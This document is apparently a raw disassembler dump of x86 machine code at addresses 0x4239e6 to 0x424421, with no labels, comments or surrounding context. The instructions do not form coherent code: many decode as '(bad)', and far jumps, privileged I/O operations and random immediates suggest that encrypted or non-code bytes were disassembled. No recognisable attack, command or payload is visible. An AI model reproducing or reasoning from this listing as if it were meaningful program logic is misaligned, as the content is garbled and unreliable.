  4239e6:	jmp    0x3102:0xddf43e88
  4239ed:	xor    BYTE PTR gs:[edx+0x3],dl
  4239f1:	sbb    eax,0xd0e3a28e
  4239f6:	pop    eax
  4239f7:	or     eax,0x81985abe
  4239fc:	and    BYTE PTR [ecx],0x2c
  4239ff:	push   ebx
  423a00:	ins    BYTE PTR es:[edi],dx
  423a01:	stos   BYTE PTR es:[edi],al
  423a02:	jecxz  0x42399f
  423a04:	enter  0x7c7b,0x40
  423a08:	or     BYTE PTR [ebp-0x23],0xfa
  423a0c:	dec    edi
  423a0d:	xor    ebp,eax
  423a0f:	sahf   
  423a10:	pop    ss
  423a11:	adc    BYTE PTR [eax],cl
  423a13:	scas   al,BYTE PTR es:[edi]
  423a14:	int3   
  423a15:	fs aaa 
  423a17:	cmc    
  423a18:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  423a1a:	dec    eax
  423a1b:	arpl   WORD PTR [edi-0x77],di
  423a1e:	push   0x12148a6f
  423a23:	mov    edx,0x6e8bc2b6
  423a28:	lock loop 0x4239cc
  423a2b:	inc    esi
  423a2c:	jb     0x423a91
  423a2e:	jns    0x4239d2
  423a30:	in     al,dx
  423a31:	mov    dl,0xa0
  423a33:	cli    
  423a34:	jne    0x423a25
  423a36:	adc    al,0x49
  423a38:	jo     0x423a87
  423a3a:	and    eax,0x88dc889c
  423a3f:	pushf  
  423a40:	mov    ds:0xa5a6e2f1,al
  423a45:	ficomp DWORD PTR [eax]
  423a47:	iret   
  423a48:	mov    esi,0xca27ce40
  423a4d:	lea    edx,[ebp-0x611448b6]
  423a53:	jle    0x423aa0
  423a55:	push   eax
  423a56:	mov    ch,0x78
  423a58:	xlat   BYTE PTR ds:[ebx]
  423a59:	movd   DWORD PTR [ebp-0x3],mm2
  423a5d:	sbb    eax,0x350b06b7
  423a62:	(bad)  
  423a63:	mul    DWORD PTR [edx+0x2f835154]
  423a69:	push   cs
  423a6a:	mov    ecx,0x7fc83211
  423a6f:	fcmovbe st,st(3)
  423a71:	inc    edi
  423a72:	pop    eax
  423a73:	xchg   ecx,eax
  423a74:	jl     0x423a51
  423a76:	xlat   BYTE PTR ds:[ebx]
  423a77:	jg     0x423a52
  423a79:	pop    ebx
  423a7a:	lea    ebp,[eax]
  423a7c:	add    eax,0x54a77f13
  423a81:	repz popa 
  423a83:	outs   dx,DWORD PTR ds:[esi]
  423a84:	mov    ah,0x20
  423a86:	sbb    edi,ecx
  423a88:	xchg   DWORD PTR [ebx-0x2d93a29b],edi
  423a8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a8f:	add    al,0x0
	...
  423af1:	add    BYTE PTR [eax],al
  423af3:	add    BYTE PTR [eax],dh
  423af5:	cmp    eax,0xdf7d9f75
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	and    ah,cl
  423b02:	and    ecx,0x7c
  423b05:	jl     0x423b08
  423b07:	add    BYTE PTR [ecx+eax*1],al
  423b0a:	add    BYTE PTR [eax],al
  423b0c:	push   ds
  423b0d:	iret   
  423b0e:	in     al,dx
  423b0f:	xchg   esp,eax
  423b10:	pop    ebp
  423b11:	int3   
  423b12:	out    0x4d,al
  423b14:	ins    DWORD PTR es:[edi],dx
  423b15:	daa    
  423b16:	sub    al,0x93
  423b18:	ret    0x6cb9
  423b1b:	add    al,0x84
  423b1d:	inc    ecx
  423b1e:	jl     0x423b56
  423b20:	jmp    0xe824:0xedefbf26
  423b27:	jge    0x423b92
  423b29:	cdq    
  423b2a:	enter  0xa5b4,0x97
  423b2e:	sti    
  423b2f:	js     0x423b06
  423b31:	popa   
  423b32:	jbe    0x423b90
  423b34:	js     0x423b66
  423b36:	sub    al,0xa7
  423b38:	inc    ecx
  423b39:	jb     0x423acf
  423b3b:	and    DWORD PTR [edi],esi
  423b3d:	sub    eax,0xb21814a9
  423b42:	inc    eax
  423b43:	(bad)  
  423b44:	aad    0x8
  423b46:	fisub  WORD PTR ds:0x54a6270d
  423b4c:	in     eax,dx
  423b4d:	lods   al,BYTE PTR ds:[esi]
  423b4e:	test   DWORD PTR [ecx+0x4390e0af],edx
  423b54:	inc    eax
  423b55:	mov    ch,0x4f
  423b57:	fmul   DWORD PTR [ebp-0x7c2f1157]
  423b5d:	scas   al,BYTE PTR es:[edi]
  423b5e:	jae    0x423b04
  423b60:	call   0x1da61c09
  423b65:	js     0x423bc3
  423b67:	mov    DWORD PTR [edx],edi
  423b69:	mov    bl,0x8f
  423b6b:	cmp    DWORD PTR [esi+esi*4],ebp
  423b6e:	mov    BYTE PTR [eax],cl
  423b70:	test   dh,dl
  423b72:	ins    DWORD PTR es:[edi],dx
  423b73:	xchg   BYTE PTR [edi+0x5d3d85a8],cl
  423b79:	clc    
  423b7a:	lds    esp,FWORD PTR [ebx+eax*8]
  423b7d:	jns    0x423b6b
  423b7f:	cmp    BYTE PTR [ebx-0x60acfc41],al
  423b85:	pop    edx
  423b86:	pushf  
  423b87:	ja     0x423b59
  423b89:	ret    0x461f
  423b8c:	loopne 0x423b38
  423b8e:	scas   al,BYTE PTR es:[edi]
  423b8f:	push   esi
  423b90:	test   eax,0x31605a98
  423b95:	cmp    cl,bl
  423b97:	and    ebp,DWORD PTR cs:[ecx]
  423b9a:	retf   0x9893
  423b9d:	cmc    
  423b9e:	xor    BYTE PTR [edx],cl
  423ba0:	inc    eax
  423ba1:	sub    al,0x27
  423ba3:	icebp  
  423ba4:	or     dl,BYTE PTR [eax+0x6bd7dfa6]
  423baa:	pop    esp
  423bab:	mov    ebp,0x6e89644d
  423bb0:	pop    ecx
  423bb1:	loopne 0x423b78
  423bb3:	lea    esp,[edx+eax*4-0x2ffa271a]
  423bba:	xor    DWORD PTR [esi-0x68],esp
  423bbd:	cmp    dl,BYTE PTR [edi+0x68529ecd]
  423bc3:	mov    WORD PTR [edi],gs
  423bc5:	sbb    WORD PTR [esi],0xc1f3
  423bca:	test   al,0xb9
  423bcc:	pop    ds
  423bcd:	xchg   esp,eax
  423bce:	xlat   BYTE PTR ds:[ebx]
  423bcf:	xchg   ebp,eax
  423bd0:	arpl   WORD PTR [edx+eax*2-0x25],dx
  423bd4:	sub    al,0x7c
  423bd6:	sbb    edi,DWORD PTR [ebp-0x33]
  423bd9:	inc    esi
  423bda:	in     al,dx
  423bdb:	jnp    0x423b99
  423bdd:	push   ss
  423bde:	and    al,0xb7
  423be0:	pop    cx
  423be2:	mov    esi,0x7abe68bc
  423be7:	out    0xe,eax
  423be9:	popw   es
  423beb:	xchg   ebx,eax
  423bec:	arpl   WORD PTR [edi+0x1c],ax
  423bef:	dec    ebp
  423bf0:	fisttp DWORD PTR [edx]
  423bf2:	and    esp,ecx
  423bf4:	in     eax,dx
  423bf5:	test   eax,0x4c44c98c
  423bfa:	pop    esp
  423bfb:	jl     0x423c1a
  423bfd:	sub    BYTE PTR [ebx],cl
  423bff:	mov    ah,dh
  423c01:	aam    0xa8
  423c03:	rcl    DWORD PTR [eax],0xe8
  423c06:	lods   eax,DWORD PTR ds:[esi]
  423c07:	test   BYTE PTR [eax+0x66],bl
  423c0a:	add    dl,BYTE PTR [esi+ebp*1+0x44]
  423c0e:	(bad)  
  423c0f:	adc    al,BYTE PTR [eax]
	...
  423c71:	add    BYTE PTR [eax],al
  423c73:	add    ch,bh
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax-0x44bb99e9]
  423c81:	rcr    BYTE PTR [edi],cl
  423c83:	mov    ds:0x17d80,eax
  423c88:	add    al,0x1
  423c8a:	add    BYTE PTR [eax],al
  423c8c:	popf   
  423c8d:	and    bh,ch
  423c8f:	inc    esp
  423c90:	inc    ebx
  423c91:	inc    BYTE PTR [edi+0x59]
  423c94:	and    ah,BYTE PTR [esi+edi*8-0x5e]
  423c98:	mov    ah,0xd9
  423c9a:	iret   
  423c9b:	fldcw  WORD PTR [edx+0x57]
  423c9e:	mov    ah,0x18
  423ca0:	push   0x77
  423ca2:	mov    ebx,0xb8f7b30c
  423ca7:	dec    edi
  423ca8:	ss or  ecx,edi
  423cab:	loope  0x423cf9
  423cad:	sub    DWORD PTR [edi],edi
  423caf:	push   ecx
  423cb0:	mov    ds,WORD PTR [ebx+0xc88fabb]
  423cb6:	push   edi
  423cb7:	data16 jg 0x423c77
  423cba:	in     al,0x34
  423cbc:	in     eax,dx
  423cbd:	loop   0x423cc1
  423cbf:	push   es
  423cc0:	add    DWORD PTR [eax-0x2a],ebp
  423cc3:	mov    dl,0x73
  423cc5:	ret    
  423cc6:	out    dx,al
  423cc7:	mov    esi,0x140387a8
  423ccc:	imul   DWORD PTR [edx]
  423cce:	adc    cl,BYTE PTR [ebx+0xd]
  423cd1:	xlat   BYTE PTR ds:[ebx]
  423cd2:	test   esi,ecx
  423cd4:	ins    BYTE PTR es:[edi],dx
  423cd5:	push   ebx
  423cd6:	lods   al,BYTE PTR ds:[esi]
  423cd7:	mov    dh,0x5
  423cd9:	int    0xea
  423cdb:	cwde   
  423cdc:	dec    edi
  423cdd:	xchg   BYTE PTR [edx+0x223b2ba1],al
  423ce3:	ins    BYTE PTR es:[edi],dx
  423ce4:	pop    es
  423ce5:	cwde   
  423ce6:	sub    DWORD PTR [eax+ecx*1-0x4c83264e],0x8d486e3
  423cf1:	fwait
  423cf2:	je     0x423d22
  423cf4:	pop    esi
  423cf5:	aaa    
  423cf6:	(bad)  
  423cf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423cf9:	ret    0xe80c
  423cfc:	inc    edx
  423cfd:	stos   BYTE PTR es:[edi],al
  423cfe:	inc    DWORD PTR [ebp+0x1b]
  423d01:	push   ds
  423d02:	jle    0x423ca6
  423d04:	inc    eax
  423d05:	pop    ss
  423d06:	adc    dl,ch
  423d08:	push   0xffffffc3
  423d0a:	jg     0x423cfa
  423d0c:	fsubr  QWORD PTR [ebp-0x57]
  423d0f:	pop    ebp
  423d10:	mov    ah,0xc9
  423d12:	and    cl,BYTE PTR [ecx-0x4b]
  423d15:	ret    
  423d16:	push   0xffffffde
  423d18:	dec    ebp
  423d19:	mov    DWORD PTR [esp+ebp*4+0xa7a9040],esp
  423d20:	(bad)  
  423d21:	jge    0x423cbf
  423d23:	jl     0x423d7d
  423d25:	fprem1 
  423d27:	dec    eax
  423d28:	pop    ebp
  423d29:	rcr    cl,cl
  423d2b:	call   0x6ab44faa
  423d30:	(bad)  
  423d31:	cld    
  423d32:	jmp    0xa526:0x8e693831
  423d39:	scas   eax,DWORD PTR es:[edi]
  423d3a:	in     al,dx
  423d3b:	jns    0x423d7c
  423d3d:	jge    0x423d98
  423d3f:	jl     0x423d63
  423d41:	push   0x1f5f6219
  423d46:	aas    
  423d47:	(bad)  
  423d48:	retf   
  423d49:	cmp    eax,0x56b86034
  423d4e:	xchg   esi,eax
  423d4f:	cld    
  423d50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d51:	pop    ebp
  423d52:	(bad)  
  423d53:	mov    esp,0x4b7ca890
  423d58:	retf   
  423d59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d5a:	xchg   edx,eax
  423d5b:	sbb    dl,BYTE PTR [ecx+0x4117ffe3]
  423d61:	inc    esi
  423d62:	retfw  0x1f28
  423d66:	mov    dl,0xf6
  423d68:	lods   al,BYTE PTR ds:[esi]
  423d69:	inc    esi
  423d6a:	jecxz  0x423dbf
  423d6c:	add    cl,BYTE PTR [ebp+0x40]
  423d6f:	push   ebp
  423d70:	fistp  QWORD PTR [esi-0x19]
  423d73:	loope  0x423d49
  423d75:	fistp  QWORD PTR [ebx]
  423d77:	popf   
  423d78:	stos   DWORD PTR es:[edi],eax
  423d79:	emms   
  423d7b:	retf   
  423d7c:	xchg   edi,eax
  423d7d:	imul   ebp,DWORD PTR [eax+esi*2-0x7f84101c],0xd3c9bbda
  423d88:	or     BYTE PTR [ebx+0x6],bh
  423d8b:	dec    ebp
  423d8c:	(bad)  
  423d8d:	cmp    DWORD PTR [edx+esi*2+0x0],esp
	...
  423df4:	(bad)  
  423df5:	test   BYTE PTR [edi-0x118668f7],0xff
  423dfc:	daa    
  423dfd:	mov    DWORD PTR [eax-0x409e912e],esp
  423e03:	cmp    eax,DWORD PTR [esi+edi*2+0x1040001]
  423e0a:	add    BYTE PTR [eax],al
  423e0c:	jecxz  0x423e6a
  423e0e:	sub    al,0xf2
  423e10:	push   ebx
  423e11:	in     al,dx
  423e12:	mov    WORD PTR [esp+ebx*8+0x1fae4081],?
  423e19:	xor    WORD PTR [edi-0x483346c0],di
  423e20:	mov    ah,BYTE PTR ss:[esi-0x24]
  423e24:	inc    edi
  423e25:	inc    esi
  423e26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e27:	adc    eax,0xcbd57d62
  423e2c:	add    al,ch
  423e2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e2f:	pushf  
  423e30:	add    DWORD PTR [edi-0x6b],0xffffffd4
  423e34:	es and eax,0x2c529c4d
  423e3a:	sar    DWORD PTR [edi+eax*8+0x56],cl
  423e3e:	or     DWORD PTR [ebp+0x4a1a034e],ebp
  423e44:	xrelease xchg DWORD PTR [eax+0x27],esi
  423e48:	lds    ebp,FWORD PTR [ecx+0x19]
  423e4b:	xchg   bl,bl
  423e4d:	xchg   ebp,eax
  423e4e:	out    dx,al
  423e4f:	mov    ebp,0x8d5edd3b
  423e54:	dec    edi
  423e55:	mov    eax,ds:0xd4d0cd0a
  423e5a:	popa   
  423e5b:	into   
  423e5c:	jb     0x423e80
  423e5e:	add    DWORD PTR [esi-0x29],0x60
  423e62:	pop    eax
  423e63:	mul    edx
  423e65:	jns    0x423e6f
  423e67:	cli    
  423e68:	fisttp DWORD PTR [eax-0x6a]
  423e6b:	sbb    dl,dl
  423e6d:	hlt    
  423e6e:	dec    edi
  423e6f:	push   ebx
  423e70:	arpl   sp,cx
  423e72:	js     0x423e70
  423e74:	add    eax,0xc9af4b46
  423e79:	test   BYTE PTR [ebx-0x14fdf569],dh
  423e7f:	ret    
  423e80:	xlat   BYTE PTR ds:[ebx]
  423e81:	(bad)  
  423e82:	sub    DWORD PTR [edx+0x44cf3986],ecx
  423e88:	jecxz  0x423e9c
  423e8a:	aad    0xcc
  423e8c:	(bad)  
  423e8d:	dec    esi
  423e8e:	cwde   
  423e8f:	xchg   DWORD PTR [edi+0x11],ebp
  423e92:	es sti 
  423e94:	(bad)  
  423e95:	mov    fs,WORD PTR [ebx]
  423e97:	std    
  423e98:	xchg   edx,eax
  423e99:	adc    bh,ah
  423e9b:	loop   0x423e85
  423e9d:	call   0x1dae5649
  423ea2:	sbb    al,0x69
  423ea4:	mov    eax,ds:0x6d0b6c85
  423ea9:	jae    0x423f0e
  423eab:	jmp    0x5f84:0x46e7f547
  423eb2:	mov    BYTE PTR [edx+0x1c],cl
  423eb5:	fmul   st,st(0)
  423eb7:	stos   DWORD PTR es:[edi],eax
  423eb8:	fnsave [ebx-0x45]
  423ebb:	(bad)  
  423ebc:	test   eax,0x51aad16f
  423ec1:	ja     0x423ea0
  423ec3:	mov    edx,0x4ba2414e
  423ec8:	push   0x87c367cd
  423ecd:	std    
  423ece:	and    eax,0x1fa849e6
  423ed3:	inc    edi
  423ed4:	(bad)  
  423ed5:	fucomp st(1)
  423ed7:	dec    ebx
  423ed8:	dec    ebx
  423ed9:	imul   ecx,ecx,0xffffffa7
  423edc:	jo     0x423f55
  423ede:	cdq    
  423edf:	pushf  
  423ee0:	or     DWORD PTR [ebx-0x5f81c581],ecx
  423ee6:	lods   eax,DWORD PTR ds:[esi]
  423ee7:	inc    ebp
  423ee8:	les    esp,FWORD PTR [edi-0x68]
  423eeb:	popf   
  423eec:	mov    gs,edi
  423eee:	jns    0x423f3b
  423ef0:	jne    0x423e89
  423ef2:	mov    eax,ds:0x57954856
  423ef7:	jb     0x423f30
  423ef9:	adc    al,0x3e
  423efb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423efc:	stc    
  423efd:	dec    ecx
  423efe:	mov    ds:0xd0bce40e,al
  423f03:	mov    bl,BYTE PTR [edx+0x34]
  423f06:	je     0x423ec7
  423f08:	inc    eax
  423f09:	mov    di,0x5521
  423f0d:	inc    esp
  423f0e:	scas   al,BYTE PTR es:[edi]
  423f0f:	dec    eax
	...
  423f74:	scas   al,BYTE PTR es:[edi]
  423f75:	call   0x9fff:0xff74b964
  423f7c:	adc    al,0x96
  423f7e:	sbb    al,0xd9
  423f80:	dec    ebp
  423f81:	stos   BYTE PTR es:[edi],al
  423f82:	jp     0x423fe7
  423f84:	mov    BYTE PTR [edi+0x1],bh
  423f87:	add    BYTE PTR [ecx+eax*1],al
  423f8a:	add    BYTE PTR [eax],al
  423f8c:	nop
  423f8d:	fiadd  DWORD PTR cs:[edi-0x44]
  423f91:	cmc    
  423f92:	or     al,0x97
  423f94:	sub    al,0x5
  423f96:	pop    esp
  423f97:	test   eax,0x78beef98
  423f9c:	ficom  WORD PTR ds:0xa0372d9b
  423fa2:	or     BYTE PTR [ebx+0x259c8be8],0x14
  423fa9:	(bad)  
  423faa:	aaa    
  423fab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423fac:	icebp  
  423fad:	icebp  
  423fae:	and    DWORD PTR [edx-0x1af8f6e7],esp
  423fb4:	push   esp
  423fb5:	adc    dh,al
  423fb7:	cld    
  423fb8:	add    BYTE PTR [edx-0x72],dl
  423fbb:	data16 mov ds:0x6ef9bbf8,al
  423fc1:	push   0x7eb878c
  423fc6:	repnz pusha 
  423fc8:	push   cs
  423fc9:	(bad)  
  423fca:	enter  0x3ddc,0xd
  423fce:	pop    es
  423fcf:	inc    esi
  423fd0:	es mov fs,eax
  423fd3:	mov    dh,0x47
  423fd5:	rcl    DWORD PTR [edx-0x4dd525b5],1
  423fdb:	xchg   DWORD PTR [esi+ebx*8],ebp
  423fde:	jne    0x423f96
  423fe0:	call   0x98ab72bf
  423fe5:	ins    DWORD PTR es:[edi],dx
  423fe6:	push   cs
  423fe7:	jg     0x423f98
  423fe9:	dec    ebp
  423fea:	pusha  
  423feb:	in     al,dx
  423fec:	mov    dl,0xa3
  423fee:	das    
  423fef:	xchg   DWORD PTR [ebp+0x6386c255],ebp
  423ff5:	dec    esp
  423ff6:	test   eax,0x7fffbb51
  423ffb:	cdq    
  423ffc:	pop    ecx
  423ffd:	fdivr  st(4),st
  423fff:	icebp  
  424000:	arpl   WORD PTR [ebp+0x5e],sp
  424003:	scas   eax,DWORD PTR es:[edi]
  424004:	lock push cs
  424006:	js     0x424017
  424008:	xor    eax,0xb6fd7b1c
  42400d:	mov    ebx,0x56314638
  424012:	outs   dx,BYTE PTR ds:[esi]
  424013:	data16 sub al,0xc6
  424016:	pusha  
  424017:	mov    eax,ds:0x2e6e373d
  42401c:	xor    ch,BYTE PTR [ecx-0x3c6e1a36]
  424022:	in     eax,dx
  424023:	xchg   BYTE PTR [ebx+eax*2],cl
  424026:	add    bh,bl
  424028:	imul   eax,DWORD PTR [ebp+0x6f],0x2109f14c
  42402f:	aad    0xbf
  424031:	sbb    BYTE PTR [ebp+0x13],ch
  424034:	ins    DWORD PTR es:[edi],dx
  424035:	(bad)  
  424036:	int3   
  424037:	mov    ah,0x41
  424039:	(bad)  
  42403a:	out    dx,eax
  42403b:	mov    DWORD PTR ds:0xaa4174a9,esi
  424041:	xor    BYTE PTR [eax-0x58],dl
  424044:	bnd jg 0x4240b5
  424047:	in     al,0x31
  424049:	stos   BYTE PTR es:[edi],al
  42404a:	dec    ebp
  42404b:	imul   edx,DWORD PTR [edx+0x457c31af],0xe34a3675
  424055:	xchg   edi,eax
  424056:	dec    esp
  424057:	(bad)  
  424058:	fist   WORD PTR [eax+eiz*8]
  42405b:	xor    bh,BYTE PTR [edi+ebp*4]
  42405e:	call   0xb143:0x62c25982
  424065:	(bad)  
  424066:	jbe    0x424093
  424068:	push   esi
  424069:	loop   0x4240c5
  42406b:	mov    al,ds:0x8a6e71f6
  424070:	sub    BYTE PTR [esi+ebp*4+0x1c],0xaa
  424075:	push   edi
  424076:	into   
  424077:	cld    
  424078:	mov    ch,0xbb
  42407a:	cmp    eax,0x65cbceb6
  42407f:	xlat   BYTE PTR ds:[ebx]
  424080:	lods   al,BYTE PTR ds:[esi]
  424081:	ror    BYTE PTR [edi-0x6219cb78],0x8c
  424088:	ja     0x424050
  42408a:	add    DWORD PTR fs:[ebp+0x37cd08],0x0
	...
  4240f2:	add    BYTE PTR [eax],al
  4240f4:	jl     0x42414e
  4240f6:	cs mov cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	pop    ss
  424101:	xchg   BYTE PTR [edx+0x1808cb0],ch
  424107:	add    BYTE PTR [ecx+eax*1],al
  42410a:	add    BYTE PTR [eax],al
  42410c:	mov    edi,0xb57d31e6
  424111:	popa   
  424112:	pop    es
  424113:	xor    eax,0xaaee47ed
  424118:	add    edx,DWORD PTR [edx-0xc8d3a23]
  42411e:	std    
  42411f:	jg     0x42413f
  424121:	or     al,0x11
  424123:	add    ecx,DWORD PTR [eax]
  424125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424126:	inc    ebp
  424127:	outs   dx,BYTE PTR ds:[esi]
  424128:	mov    al,ds:0x48b422b3
  42412d:	jb     0x42415f
  42412f:	jae    0x4240de
  424131:	xor    al,0x4a
  424133:	xchg   ebp,eax
  424134:	jb     0x424173
  424136:	fdiv   st(4),st
  424138:	js     0x42410f
  42413a:	or     edi,DWORD PTR [ebx+0x60]
  42413d:	push   esp
  42413e:	mov    ch,BYTE PTR [edi]
  424140:	sbb    al,0xe8
  424142:	add    eax,0xb10aa09d
  424147:	(bad)  
  424148:	mov    eax,ds:0x4fdd9f6d
  42414d:	mov    ds:0x94b5c65e,ax
  424153:	mulps  xmm6,XMMWORD PTR ds:0x7f1534fc
  42415a:	fs daa 
  42415c:	pop    ss
  42415d:	jae    0x4241b6
  42415f:	fcom   DWORD PTR [eax-0x44]
  424162:	mov    ah,0x2
  424164:	or     dl,bh
  424166:	push   edi
  424167:	jle    0x424149
  424169:	sbb    edi,DWORD PTR [ecx-0x60]
  42416c:	mov    ebp,0xa443e626
  424171:	lea    ebx,cs:[ebx+0xf]
  424175:	int    0xfb
  424177:	or     BYTE PTR [esi-0x13],0x1d
  42417b:	pop    edi
  42417c:	stc    
  42417d:	pop    edi
  42417e:	mov    bl,0xba
  424180:	mov    ebp,ebp
  424182:	inc    esi
  424183:	cld    
  424184:	rcl    BYTE PTR [eax],1
  424186:	jne    0x424186
  424188:	stos   DWORD PTR es:[edi],eax
  424189:	sbb    eax,0xdb082af9
  42418e:	push   edi
  42418f:	dec    esp
  424190:	inc    edx
  424191:	loope  0x424157
  424193:	mov    esp,0xc589e2d6
  424198:	(bad)  
  424199:	outs   dx,BYTE PTR ds:[esi]
  42419a:	jge    0x424160
  42419c:	icebp  
  42419d:	in     al,dx
  42419e:	rol    BYTE PTR [edx],1
  4241a0:	call   0x3fe4:0xc990c552
  4241a7:	mov    ds:0x8fa3b09c,eax
  4241ac:	fistp  QWORD PTR [ecx-0x5a1ccda1]
  4241b2:	inc    ebp
  4241b3:	cmp    eax,0x2fbcddcf
  4241b8:	and    dl,0xf3
  4241bb:	xchg   ah,bh
  4241bd:	dec    esp
  4241be:	ret    0xfb04
  4241c1:	ss data16 sub al,0x88
  4241c5:	leave  
  4241c6:	(bad)  
  4241c8:	fcomi  st,st(5)
  4241ca:	inc    edx
  4241cb:	add    DWORD PTR ds:[ecx-0x4e],0x3b768c13
  4241d3:	push   es
  4241d4:	inc    ebp
  4241d5:	dec    ebx
  4241d6:	jmp    0x424171
  4241d8:	stos   BYTE PTR es:[edi],al
  4241d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4241da:	ror    BYTE PTR [edi+0x67dfce2],1
  4241e0:	call   0x316434f5
  4241e5:	dec    esp
  4241e6:	xchg   esi,eax
  4241e7:	pop    esp
  4241e8:	sbb    ch,BYTE PTR [edx]
  4241ea:	inc    eax
  4241eb:	dec    ebp
  4241ec:	mov    esp,ds
  4241ee:	jns    0x4241dc
  4241f0:	push   cs
  4241f1:	dec    edi
  4241f2:	mov    al,0x4c
  4241f4:	mov    es,WORD PTR [eax+0x1a]
  4241f7:	fld    TBYTE PTR [ecx+0x2362f6f7]
  4241fd:	repz jmp 0xc777:0x1784e14c
  424205:	push   ebx
  424206:	xchg   ebp,esp
  424208:	xlat   BYTE PTR ds:[ebx]
  424209:	and    DWORD PTR fs:[ebp-0x1b],esi
  42420d:	xchg   BYTE PTR [ebp-0x18],ch
	...
  424274:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	test   DWORD PTR [esi+esi*8-0x3c],0x18190
  424288:	add    al,0x1
  42428a:	add    BYTE PTR [eax],al
  42428c:	ins    BYTE PTR es:[edi],dx
  42428d:	jp     0x4242c5
  42428f:	cli    
  424290:	jb     0x42430c
  424292:	mov    WORD PTR [ebp-0x1b],ss
  424295:	mov    ebx,0xe10fc54c
  42429a:	es xor eax,0xb2432097
  4242a0:	dec    esp
  4242a1:	cdq    
  4242a2:	pop    ss
  4242a3:	out    dx,al
  4242a4:	push   ss
  4242a5:	call   esi
  4242a7:	rcl    DWORD PTR fs:[ebx-0x42],cl
  4242ab:	jp     0x42428d
  4242ad:	ret    0x2db3
  4242b0:	in     al,0x30
  4242b2:	stos   BYTE PTR es:[edi],al
  4242b3:	xchg   esi,eax
  4242b4:	retf   0x80f0
  4242b7:	mov    bh,0x3f
  4242b9:	sub    eax,0x26736b6d
  4242be:	sti    
  4242bf:	mov    esi,0x3bc76912
  4242c4:	sub    al,0x2f
  4242c6:	jnp    0x4242c1
  4242c8:	dec    esp
  4242c9:	mov    ch,0x80
  4242cb:	cmc    
  4242cc:	(bad)  
  4242cd:	and    eax,0x72e9a1a1
  4242d2:	ret    0xcc0e
  4242d5:	dec    esp
  4242d6:	or     eax,0x69734755
  4242db:	add    DWORD PTR [edi],eax
  4242dd:	outs   dx,BYTE PTR ds:[esi]
  4242de:	pop    ss
  4242df:	fistp  WORD PTR [ecx+edi*4]
  4242e2:	cld    
  4242e3:	into   
  4242e4:	xchg   edi,eax
  4242e5:	call   0xed5324ca
  4242ea:	rol    BYTE PTR [ebx+0x1d293ec6],cl
  4242f0:	and    DWORD PTR [ebx+0xd],0xffffffa2
  4242f4:	das    
  4242f5:	or     al,0x69
  4242f7:	add    al,0x0
  4242f9:	and    BYTE PTR [esi],bh
  4242fb:	inc    edi
  4242fc:	rol    BYTE PTR [esi+eax*8],1
  4242ff:	mov    BYTE PTR [esi-0xed205cf],bh
  424305:	jnp    0x4242f8
  424307:	fisttp DWORD PTR [edx+0x1a001743]
  42430d:	imul   ebp,DWORD PTR [eax+ebp*2-0x573580d4],0xe037a66b
  424318:	(bad)  
  424319:	adc    dh,ch
  42431b:	dec    edi
  42431c:	ret    
  42431d:	js     0x42432b
  42431f:	cmp    BYTE PTR [esi-0x7f],dl
  424322:	push   ebp
  424323:	jno    0x42437e
  424325:	jo     0x4242c3
  424327:	mov    dh,0x6e
  424329:	test   esi,ebx
  42432b:	loope  0x424353
  42432d:	es sti 
  42432f:	pop    ebx
  424330:	dec    eax
  424331:	sub    esi,edi
  424333:	cmp    DWORD PTR [esi],ebx
  424335:	add    BYTE PTR [ecx+esi*8+0xb4d6f41],dh
  42433c:	dec    edi
  42433d:	mov    dl,0x55
  42433f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424340:	jno    0x4243a8
  424342:	and    BYTE PTR [eax],al
  424344:	mov    ds:0x580078b,al
  424349:	push   esp
  42434a:	xor    bl,BYTE PTR [edx+edx*1]
  42434d:	ffreep st(3)
  42434f:	pushf  
  424350:	or     BYTE PTR [edi-0x80],dh
  424353:	scas   al,BYTE PTR es:[edi]
  424354:	pop    ebp
  424355:	scas   al,BYTE PTR es:[edi]
  424356:	sti    
  424357:	leave  
  424358:	movhps QWORD PTR [ecx+0x25],xmm2
  42435c:	je     0x424382
  42435e:	xchg   esp,eax
  42435f:	into   
  424360:	inc    ebp
  424361:	jmp    0xc3341846
  424366:	add    BYTE PTR [ebx],dh
  424368:	aad    0x60
  42436a:	test   al,0x76
  42436c:	xor    al,0xdf
  42436e:	xor    al,0xb7
  424370:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424371:	jl     0x4243d1
  424373:	push   0x46
  424375:	enter  0xbba9,0x37
  424379:	push   esi
  42437a:	int3   
  42437b:	pop    ebx
  42437c:	push   ss
  42437d:	sub    dh,ch
  42437f:	aad    0x3f
  424381:	stos   DWORD PTR es:[edi],eax
  424382:	mov    WORD PTR [ebp+0x4c370af3],?
  424388:	or     eax,0xa8fd8695
  42438d:	mov    bl,0x50
  42438f:	retf   
	...
  4243f4:	mov    ah,BYTE PTR [esi]
  4243f6:	jge    0x4243b2
  4243f8:	std    
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x4243e2
  424401:	sub    edx,DWORD PTR [eax]
  424403:	ret    0x8294
  424406:	add    DWORD PTR [eax],eax
  424408:	add    al,0x1
  42440a:	add    BYTE PTR [eax],al
  42440c:	ss mov ah,0xc4
  42440f:	sub    al,0xb0
  424411:	addr16 jge 0x4243a3
  424414:	mov    dh,0xd7
  424416:	sbb    DWORD PTR [esi],edi
  424418:	adc    eax,0xf86f7f77
  42441d:	and    ch,0xe9
  424420:	inc    eax
  424421:	and    al,BYTE PTR [esi-0x37]
